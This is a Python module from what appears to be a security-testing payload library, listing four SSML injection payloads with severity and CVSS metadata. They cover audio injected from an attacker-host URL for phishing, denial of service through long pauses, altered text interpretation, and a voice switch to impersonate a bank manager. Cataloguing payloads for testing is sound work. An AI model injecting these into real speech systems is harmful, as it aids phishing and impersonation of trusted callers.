#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

SSML Injection Payloads
"""

from ..models import PayloadEntry

SSML_PAYLOADS = {
    "ssml_audio_src": PayloadEntry(
        payload="<speak><audio src='https://attacker.com/fake_error.mp3'/></speak>",
        contexts=["ssml"],
        severity="medium",
        cvss_score=6.0,
        description="Injecting arbitrary audio file via SSML",
        tags=["ssml", "audio", "phishing"],
        reliability="high",
        attack_surface="api",
    ),
    "ssml_break_dos": PayloadEntry(
        payload="<speak><break time='10s'/><break time='10s'/><break time='10s'/></speak>",
        contexts=["ssml"],
        severity="low",
        cvss_score=4.0,
        description="Denial of service via long pauses",
        tags=["ssml", "dos", "break"],
        reliability="high",
        attack_surface="api",
    ),
    "ssml_say_as_interpret": PayloadEntry(
        payload="<speak><say-as interpret-as='telephone'>555-0199</say-as></speak>",
        contexts=["ssml"],
        severity="low",
        cvss_score=3.0,
        description="Changing interpretation of text",
        tags=["ssml", "manipulation"],
        reliability="medium",
        attack_surface="api",
    ),
    "ssml_voice_change": PayloadEntry(
        payload="<speak><voice name='Kendra'>I am your bank manager.</voice></speak>",
        contexts=["ssml"],
        severity="medium",
        cvss_score=5.5,
        description="Changing voice persona for social engineering",
        tags=["ssml", "social-engineering"],
        reliability="medium",
        attack_surface="api",
    ),
}

SSML_TOTAL = len(SSML_PAYLOADS)
